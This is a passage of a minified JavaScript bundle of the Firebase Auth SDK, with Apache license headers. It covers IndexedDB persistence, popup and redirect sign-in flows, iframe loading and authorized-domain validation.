 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class uj{constructor(e){this.target=e,this.handlers=new Set}removeMessageHandler(e){e.messageChannel&&(e.messageChannel.port1.removeEventListener("message",e.onMessage),e.messageChannel.port1.close()),this.handlers.delete(e)}async _send(e,t,r=50){const i=typeof MessageChannel<"u"?new MessageChannel:null;if(!i)throw new Error("connection_unavailable");let s,o;return new Promise((a,l)=>{const u=Mv("",20);i.port1.start();const h=setTimeout(()=>{l(new Error("unsupported_event"))},r);o={messageChannel:i,onMessage(f){const p=f;if(p.data.eventId===u)switch(p.data.status){case"ack":clearTimeout(h),s=setTimeout(()=>{l(new Error("timeout"))},3e3);break;case"done":clearTimeout(s),a(p.data.response);break;default:clearTimeout(h),clearTimeout(s),l(new Error("invalid_response"));break}}},this.handlers.add(o),i.port1.addEventListener("message",o.onMessage),this.target.postMessage({eventType:e,eventId:u,data:t},[i.port2])}).finally(()=>{o&&this.removeMessageHandler(o)})}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ci(){return window}function hj(n){Ci().location.href=n}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Q2(){return typeof Ci().WorkerGlobalScope<"u"&&typeof Ci().importScripts=="function"}async function fj(){if(!(navigator!=null&&navigator.serviceWorker))return null;try{return(await navigator.serviceWorker.ready).active}catch{return null}}function dj(){var n;return((n=navigator==null?void 0:navigator.serviceWorker)===null||n===void 0?void 0:n.controller)||null}function pj(){return Q2()?self:null}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Y2="firebaseLocalStorageDb",gj=1,zd="firebaseLocalStorage",Z2="fbase_key";class _h{constructor(e){this.request=e}toPromise(){return new Promise((e,t)=>{this.request.addEventListener("success",()=>{e(this.request.result)}),this.request.addEventListener("error",()=>{t(this.request.error)})})}}function Qp(n,e){return n.transaction([zd],e?"readwrite":"readonly").objectStore(zd)}function mj(){const n=indexedDB.deleteDatabase(Y2);return new _h(n).toPromise()}function Iy(){const n=indexedDB.open(Y2,gj);return new Promise((e,t)=>{n.addEventListener("error",()=>{t(n.error)}),n.addEventListener("upgradeneeded",()=>{const r=n.result;try{r.createObjectStore(zd,{keyPath:Z2})}catch(i){t(i)}}),n.addEventListener("success",async()=>{const r=n.result;r.objectStoreNames.contains(zd)?e(r):(r.close(),await mj(),e(await Iy()))})})}async function TI(n,e,t){const r=Qp(n,!0).put({[Z2]:e,value:t});return new _h(r).toPromise()}async function yj(n,e){const t=Qp(n,!1).get(e),r=await new _h(t).toPromise();return r===void 0?null:r.value}function AI(n,e){const t=Qp(n,!0).delete(e);return new _h(t).toPromise()}const wj=800,vj=3;class J2{constructor(){this.type="LOCAL",this._shouldAllowMigration=!0,this.listeners={},this.localCache={},this.pollTimer=null,this.pendingWrites=0,this.receiver=null,this.sender=null,this.serviceWorkerReceiverAvailable=!1,this.activeServiceWorker=null,this._workerInitializationPromise=this.initializeServiceWorkerMessaging().then(()=>{},()=>{})}async _openDb(){return this.db?this.db:(this.db=await Iy(),this.db)}async _withRetries(e){let t=0;for(;;)try{const r=await this._openDb();return await e(r)}catch(r){if(t++>vj)throw r;this.db&&(this.db.close(),this.db=void 0)}}async initializeServiceWorkerMessaging(){return Q2()?this.initializeReceiver():this.initializeSender()}async initializeReceiver(){this.receiver=Gp._getInstance(pj()),this.receiver._subscribe("keyChanged",async(e,t)=>({keyProcessed:(await this._poll()).includes(t.key)})),this.receiver._subscribe("ping",async(e,t)=>["keyChanged"])}async initializeSender(){var e,t;if(this.activeServiceWorker=await fj(),!this.activeServiceWorker)return;this.sender=new uj(this.activeServiceWorker);const r=await this.sender._send("ping",{},800);r&&!((e=r[0])===null||e===void 0)&&e.fulfilled&&!((t=r[0])===null||t===void 0)&&t.value.includes("keyChanged")&&(this.serviceWorkerReceiverAvailable=!0)}async notifyServiceWorker(e){if(!(!this.sender||!this.activeServiceWorker||dj()!==this.activeServiceWorker))try{await this.sender._send("keyChanged",{key:e},this.serviceWorkerReceiverAvailable?800:50)}catch{}}async _isAvailable(){try{if(!indexedDB)return!1;const e=await Iy();return await TI(e,Fd,"1"),await AI(e,Fd),!0}catch{}return!1}async _withPendingWrite(e){this.pendingWrites++;try{await e()}finally{this.pendingWrites--}}async _set(e,t){return this._withPendingWrite(async()=>(await this._withRetries(r=>TI(r,e,t)),this.localCache[e]=t,this.notifyServiceWorker(e)))}async _get(e){const t=await this._withRetries(r=>yj(r,e));return this.localCache[e]=t,t}async _remove(e){return this._withPendingWrite(async()=>(await this._withRetries(t=>AI(t,e)),delete this.localCache[e],this.notifyServiceWorker(e)))}async _poll(){const e=await this._withRetries(i=>{const s=Qp(i,!1).getAll();return new _h(s).toPromise()});if(!e)return[];if(this.pendingWrites!==0)return[];const t=[],r=new Set;if(e.length!==0)for(const{fbase_key:i,value:s}of e)r.add(i),JSON.stringify(this.localCache[i])!==JSON.stringify(s)&&(this.notifyListeners(i,s),t.push(i));for(const i of Object.keys(this.localCache))this.localCache[i]&&!r.has(i)&&(this.notifyListeners(i,null),t.push(i));return t}notifyListeners(e,t){this.localCache[e]=t;const r=this.listeners[e];if(r)for(const i of Array.from(r))i(t)}startPolling(){this.stopPolling(),this.pollTimer=setInterval(async()=>this._poll(),wj)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}_addListener(e,t){Object.keys(this.listeners).length===0&&this.startPolling(),this.listeners[e]||(this.listeners[e]=new Set,this._get(e)),this.listeners[e].add(t)}_removeListener(e,t){this.listeners[e]&&(this.listeners[e].delete(t),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&this.stopPolling()}}J2.type="LOCAL";const _j=J2;new wh(3e4,6e4);/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Ej(n,e){return e?is(e):(Me(n._popupRedirectResolver,n,"argument-error"),n._popupRedirectResolver)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Nv extends Cv{constructor(e){super("custom","custom"),this.params=e}_getIdTokenResponse(e){return bl(e,this._buildIdpRequest())}_linkToIdToken(e,t){return bl(e,this._buildIdpRequest(t))}_getReauthenticationResolver(e){return bl(e,this._buildIdpRequest())}_buildIdpRequest(e){const t={requestUri:this.params.requestUri,sessionId:this.params.sessionId,postBody:this.params.postBody,tenantId:this.params.tenantId,pendingToken:this.params.pendingToken,returnSecureToken:!0,returnIdpCredential:!0};return e&&(t.idToken=e),t}}function Ij(n){return $2(n.auth,new Nv(n),n.bypassAuthState)}function Sj(n){const{auth:e,user:t}=n;return Me(t,e,"internal-error"),J8(t,new Nv(n),n.bypassAuthState)}async function Tj(n){const{auth:e,user:t}=n;return Me(t,e,"internal-error"),Z8(t,new Nv(n),n.bypassAuthState)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class X2{constructor(e,t,r,i,s=!1){this.auth=e,this.resolver=r,this.user=i,this.bypassAuthState=s,this.pendingPromise=null,this.eventManager=null,this.filter=Array.isArray(t)?t:[t]}execute(){return new Promise(async(e,t)=>{this.pendingPromise={resolve:e,reject:t};try{this.eventManager=await this.resolver._initialize(this.auth),await this.onExecution(),this.eventManager.registerConsumer(this)}catch(r){this.reject(r)}})}async onAuthEvent(e){const{urlResponse:t,sessionId:r,postBody:i,tenantId:s,error:o,type:a}=e;if(o){this.reject(o);return}const l={auth:this.auth,requestUri:t,sessionId:r,tenantId:s||void 0,postBody:i||void 0,user:this.user,bypassAuthState:this.bypassAuthState};try{this.resolve(await this.getIdpTask(a)(l))}catch(u){this.reject(u)}}onError(e){this.reject(e)}getIdpTask(e){switch(e){case"signInViaPopup":case"signInViaRedirect":return Ij;case"linkViaPopup":case"linkViaRedirect":return Tj;case"reauthViaPopup":case"reauthViaRedirect":return Sj;default:mi(this.auth,"internal-error")}}resolve(e){ms(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.resolve(e),this.unregisterAndCleanUp()}reject(e){ms(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.reject(e),this.unregisterAndCleanUp()}unregisterAndCleanUp(){this.eventManager&&this.eventManager.unregisterConsumer(this),this.pendingPromise=null,this.cleanUp()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Aj=new wh(2e3,1e4);class dl extends X2{constructor(e,t,r,i,s){super(e,t,i,s),this.provider=r,this.authWindow=null,this.pollId=null,dl.currentPopupAction&&dl.currentPopupAction.cancel(),dl.currentPopupAction=this}async executeNotNull(){const e=await this.execute();return Me(e,this.auth,"internal-error"),e}async onExecution(){ms(this.filter.length===1,"Popup operations only handle one event");const e=Mv();this.authWindow=await this.resolver._openPopup(this.auth,this.provider,this.filter[0],e),this.authWindow.associatedEvent=e,this.resolver._originValidation(this.auth).catch(t=>{this.reject(t)}),this.resolver._isIframeWebStorageSupported(this.auth,t=>{t||this.reject(ki(this.auth,"web-storage-unsupported"))}),this.pollUserCancellation()}get eventId(){var e;return((e=this.authWindow)===null||e===void 0?void 0:e.associatedEvent)||null}cancel(){this.reject(ki(this.auth,"cancelled-popup-request"))}cleanUp(){this.authWindow&&this.authWindow.close(),this.pollId&&window.clearTimeout(this.pollId),this.authWindow=null,this.pollId=null,dl.currentPopupAction=null}pollUserCancellation(){const e=()=>{var t,r;if(!((r=(t=this.authWindow)===null||t===void 0?void 0:t.window)===null||r===void 0)&&r.closed){this.pollId=window.setTimeout(()=>{this.pollId=null,this.reject(ki(this.auth,"popup-closed-by-user"))},8e3);return}this.pollId=window.setTimeout(e,Aj.get())};e()}}dl.currentPopupAction=null;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const bj="pendingRedirect",Ff=new Map;class xj extends X2{constructor(e,t,r=!1){super(e,["signInViaRedirect","linkViaRedirect","reauthViaRedirect","unknown"],t,void 0,r),this.eventId=null}async execute(){let e=Ff.get(this.auth._key());if(!e){try{const r=await kj(this.resolver,this.auth)?await super.execute():null;e=()=>Promise.resolve(r)}catch(t){e=()=>Promise.reject(t)}Ff.set(this.auth._key(),e)}return this.bypassAuthState||Ff.set(this.auth._key(),()=>Promise.resolve(null)),e()}async onAuthEvent(e){if(e.type==="signInViaRedirect")return super.onAuthEvent(e);if(e.type==="unknown"){this.resolve(null);return}if(e.eventId){const t=await this.auth._redirectUserForId(e.eventId);if(t)return this.user=t,super.onAuthEvent(e);this.resolve(null)}}async onExecution(){}cleanUp(){}}async function kj(n,e){const t=Mj(e),r=Rj(n);if(!await r._isAvailable())return!1;const i=await r._get(t)==="true";return await r._remove(t),i}function Cj(n,e){Ff.set(n._key(),e)}function Rj(n){return is(n._redirectPersistence)}function Mj(n){return Vf(bj,n.config.apiKey,n.name)}async function Nj(n,e,t=!1){if(oi(n.app))return Promise.reject(co(n));const r=hc(n),i=Ej(r,e),o=await new xj(r,i,t).execute();return o&&!t&&(delete o.user._redirectEventId,await r._persistUserIfCurrent(o.user),await r._setRedirectUser(null,e)),o}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Pj=10*60*1e3;class Lj{constructor(e){this.auth=e,this.cachedEventUids=new Set,this.consumers=new Set,this.queuedRedirectEvent=null,this.hasHandledPotentialRedirect=!1,this.lastProcessedEventTime=Date.now()}registerConsumer(e){this.consumers.add(e),this.queuedRedirectEvent&&this.isEventForConsumer(this.queuedRedirectEvent,e)&&(this.sendToConsumer(this.queuedRedirectEvent,e),this.saveEventToCache(this.queuedRedirectEvent),this.queuedRedirectEvent=null)}unregisterConsumer(e){this.consumers.delete(e)}onEvent(e){if(this.hasEventBeenHandled(e))return!1;let t=!1;return this.consumers.forEach(r=>{this.isEventForConsumer(e,r)&&(t=!0,this.sendToConsumer(e,r),this.saveEventToCache(e))}),this.hasHandledPotentialRedirect||!Dj(e)||(this.hasHandledPotentialRedirect=!0,t||(this.queuedRedirectEvent=e,t=!0)),t}sendToConsumer(e,t){var r;if(e.error&&!ek(e)){const i=((r=e.error.code)===null||r===void 0?void 0:r.split("auth/")[1])||"internal-error";t.onError(ki(this.auth,i))}else t.onAuthEvent(e)}isEventForConsumer(e,t){const r=t.eventId===null||!!e.eventId&&e.eventId===t.eventId;return t.filter.includes(e.type)&&r}hasEventBeenHandled(e){return Date.now()-this.lastProcessedEventTime>=Pj&&this.cachedEventUids.clear(),this.cachedEventUids.has(bI(e))}saveEventToCache(e){this.cachedEventUids.add(bI(e)),this.lastProcessedEventTime=Date.now()}}function bI(n){return[n.type,n.eventId,n.sessionId,n.tenantId].filter(e=>e).join("-")}function ek({type:n,error:e}){return n==="unknown"&&(e==null?void 0:e.code)==="auth/no-auth-event"}function Dj(n){switch(n.type){case"signInViaRedirect":case"linkViaRedirect":case"reauthViaRedirect":return!0;case"unknown":return ek(n);default:return!1}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function Oj(n,e={}){return bo(n,"GET","/v1/projects",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Bj=/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,Uj=/^https?/;async function jj(n){if(n.config.emulator)return;const{authorizedDomains:e}=await Oj(n);for(const t of e)try{if(Vj(t))return}catch{}mi(n,"unauthorized-domain")}function Vj(n){const e=_y(),{protocol:t,hostname:r}=new URL(e);if(n.startsWith("chrome-extension://")){const o=new URL(n);return o.hostname===""&&r===""?t==="chrome-extension:"&&n.replace("chrome-extension://","")===e.replace("chrome-extension://",""):t==="chrome-extension:"&&o.hostname===r}if(!Uj.test(t))return!1;if(Bj.test(n))return r===n;const i=n.replace(/\./g,"\\.");return new RegExp("^(.+\\."+i+"|"+i+")$","i").test(r)}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Fj=new wh(3e4,6e4);function xI(){const n=Ci().___jsl;if(n!=null&&n.H){for(const e of Object.keys(n.H))if(n.H[e].r=n.H[e].r||[],n.H[e].L=n.H[e].L||[],n.H[e].r=[...n.H[e].L],n.CP)for(let t=0;t<n.CP.length;t++)n.CP[t]=null}}function zj(n){return new Promise((e,t)=>{var r,i,s;function o(){xI(),gapi.load("gapi.iframes",{callback:()=>{e(gapi.iframes.getContext())},ontimeout:()=>{xI(),t(ki(n,"network-request-failed"))},timeout:Fj.get()})}if(!((i=(r=Ci().gapi)===null||r===void 0?void 0:r.iframes)===null||i===void 0)&&i.Iframe)e(gapi.iframes.getContext());else if(!((s=Ci().gapi)===null||s===void 0)&&s.load)o();else{const a=L8("iframefcb");return Ci()[a]=()=>{gapi.load?o():t(ki(n,"network-request-failed"))},j2(`${P8()}?onload=${a}`).catch(l=>t(l))}}).catch(e=>{throw zf=null,e})}let zf=null;function Wj(n){return zf=zf||zj(n),zf}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const $j=new wh(5e3,15e3),Hj="__/auth/iframe",qj="emulator/auth/iframe",Kj={style:{position:"absolute",top:"-100px",width:"1px",height:"1px"},"aria-hidden":"true",tabindex:"-1"},Gj=new Map([["identitytoolkit.googleapis.com","p"],["staging-identitytoolkit.sandbox.googleapis.com","s"],["test-identitytoolkit.sandbox.googleapis.com","t"]]);function Qj(n){const e=n.config;Me(e.authDomain,n,"auth-domain-config-required");const t=e.emulator?bv(e,qj):`https://${n.config.authDomain}/${Hj}`,r={apiKey:e.apiKey,appName:n.name,v:uc},i=Gj.get(n.config.apiHost);i&&(r.eid=i);const s=n._getFrameworks();return s.length&&(r.fw=s.join(",")),`${t}?${yh(r).slice(1)}`}async function Yj(n){const e=await Wj(n),t=Ci().gapi;return Me(t,n,"internal-error"),e.open({where:document.body,url:Qj(n),messageHandlersFilter:t.iframes.CROSS_ORIGIN_IFRAMES_FILTER,attributes:Kj,dontclear:!0},r=>new Promise(async(i,s)=>{await r.restyle({setHideOnLeave:!1});const o=ki(n,"network-request-failed"),a=Ci().setTimeout(()=>{s(o)},$j.get());function l(){Ci().clearTimeout(a),i(r)}r.ping(l).then(l,()=>{s(o)})}))}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Zj={location:"yes",resizable:"yes",statusbar:"yes",toolbar:"no"},Jj=500,Xj=600,eV="_blank",tV="http://localhost";class kI{constructor(e){this.window=e,this.associatedEvent=null}close(){if(this.window)try{this.window.close()}catch{}}}function nV(n,e,t,r=Jj,i=Xj){const s=Math.max((window.screen.availHeight-i)/2,0).toString(),o=Math.max((window.screen.availWidth-r)/2,0).toString();let a="";const l=Object.assign(Object.assign({},Zj),{width:r.toString(),height:i.toString(),top:s,left:o}),u=rr().toLowerCase();t&&(a=N2(u)?eV:t),R2(u)&&(e=e||tV,l.scrollbars="yes");const h=Object.entries(l).reduce((p,[w,x])=>`${p}${w}=${x},`,"");if(T8(u)&&a!=="_self")return rV(e||"",a),new kI(null);const f=window.open(e||"",a,h);Me(f,n,"popup-blocked");try{f.focus()}catch{}return new kI(f)}function rV(n,e){const t=document.createElement("a");t.href=n,t.target=e;const r=document.createEvent("MouseEvent");r.initMouseEvent("click",!0,!0,window,1,0,0,0,0,!1,!1,!1,!1,1,null),t.dispatchEvent(r)}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const iV="__/auth/handler",sV="emulator/auth/handler",oV=encodeURIComponent("fac");async function CI(n,e,t,r,i,s){Me(n.config.authDomain,n,"auth-domain-config-required"),Me(n.config.apiKey,n,"invalid-api-key");const o={apiKey:n.config.apiKey,appName:n.name,authType:t,redirectUrl:r,v:uc,eventId:i};if(e instanceof z2){e.setDefaultLanguage(n.languageCode),o.providerId=e.providerId||"",q5(e.getCustomParameters())||(o.customParameters=JSON.stringify(e.getCustomParameters()));for(const[h,f]of Object.entries(s||{}))o[h]=f}if(e instanceof vh){const h=e.getScopes().filter(f=>f!=="");h.length>0&&(o.scopes=h.join(","))}n.tenantId&&(o.tid=n.tenantId);const a=o;for(const h of Object.keys(a))a[h]===void 0&&delete a[h];const l=await n._getAppCheckToken(),u=l?`#${oV}=${encodeURIComponent(l)}`:"";return`${aV(n)}?${yh(a).slice(1)}${u}`}function aV({config:n}){return n.emulator?bv(n,sV):`https://${n.authDomain}/${iV}`}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Pm="webStorageSupport";class lV{constructor(){this.eventManagers={},this.iframes={},this.originValidationPromises={},this._redirectPersistence=G2,this._completeRedirectFn=Nj,this._overrideRedirectResult=Cj}async _openPopup(e,t,r,i){var s;ms((s=this.eventManagers[e._key()])===null||s===void 0?void 0:s.manager,"_initialize() not called before _openPopup()");const o=await CI(e,t,r,_y(),i);return nV(e,o,Mv())}async _openRedirect(e,t,r,i){await this._originValidation(e);const s=await CI(e,t,r,_y(),i);return hj(s),new Promise(()=>{})}_initialize(e){const t=e._key();if(this.eventManagers[t]){const{manager:i,promise:s}=this.eventManagers[t];return i?Promise.resolve(i):(ms(s,"If manager is not set, promise should be"),s)}const r=this.initAndGetManager(e);return this.eventManagers[t]={promise:r},r.catch(()=>{delete this.eventManagers[t]}),r}async initAndGetManager(e){const t=await Yj(e),r=new Lj(e);return t.register("authEvent",i=>(Me(i==null?void 0:i.authEvent,e,"invalid-auth-event"),{status:r.onEvent(i.authEvent)?"ACK":"ERROR"}),gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER),this.eventManagers[e._key()]={manager:r},this.iframes[e._key()]=t,r}_isIframeWebStorageSupported(e,t){this.iframes[e._key()].send(Pm,{type:Pm},i=>{var s;const o=(s=i==null?void 0:i[0])===null||s===void 0?void 0:s[Pm];o!==void 0&&t(!!o),mi(e,"internal-error")},gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER)}_originValidation(e){const t=e._key();return this.originValidationPromises[t]||(this.originValidationPromises[t]=jj(e)),this.originValidationPromises[t]}get _shouldInitProactively(){return B2()||M2()||kv()}}const cV=lV;var RI="@firebase/auth",MI="1.10.0";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class uV{constructor(e){this.auth=e,this.internalListeners=new Map}getUid(){var e;return this.assertAuthConfigured(),((e=this.auth.currentUser)===null||e===void 0?void 0:e.uid)||null}async getToken(e){return this.assertAuthConfigured(),await this.auth._initializationPromise,this.auth.currentUser?{accessToken:await this.auth.currentUser.getIdToken(e)}:null}addAuthTokenListener(e){if(this.assertAuthConfigured(),this.internalListeners.has(e))return;const t=this.auth.onIdTokenChanged(r=>{e((r==null?void 0:r.stsTokenManager.accessToken)||null)});this.internalListeners.set(e,t),this.updateProactiveRefresh()}removeAuthTokenListener(e){this.assertAuthConfigured();const t=this.internalListeners.get(e);t&&(this.internalListeners.delete(e),t(),this.updateProactiveRefresh())}assertAuthConfigured(){Me(this.auth._initializationPromise,"dependent-sdk-initialized-before-auth")}updateProactiveRefresh(){this.internalListeners.size>0?this.auth._startProactiveRefresh():this.auth._stopProactiveRefresh()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function hV(n){switch(n){case"Node":return"node";case"ReactNative":return"rn";case"Worker":return"webworker";case"Cordova":return"cordova";case"WebExtension":return"web-extension";default:return}}function fV(n){Hl(new pa("auth",(e,{options:t})=>{const r=e.getProvider("app").getImmediate(),i=e.getProvider("heartbeat"),s=e.getProvider("app-check-internal"),{apiKey:o,authDomain:a}=r.options;Me(o&&!o.includes(":"),"invalid-api-key",{appName:r.name});const l={apiKey:o,authDomain:a,clientPlatform:n,apiHost:"identitytoolkit.googleapis.com",tokenApiHost:"securetoken.googleapis.com",apiScheme:"https",sdkClientVersion:U2(n)},u=new R8(r,i,s,l);return V8(u,t),u},"PUBLIC").setInstantiationMode("EXPLICIT").setInstanceCreatedCallback((e,t,r)=>{e.getProvider("auth-internal").initialize()})),Hl(new pa("auth-internal",e=>{const t=hc(e.getProvider("auth").getImmediate());return(r=>new uV(r))(t)},"PRIVATE").setInstantiationMode("EXPLICIT")),lo(RI,MI,hV(n)),lo(RI,MI,"esm2017")}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
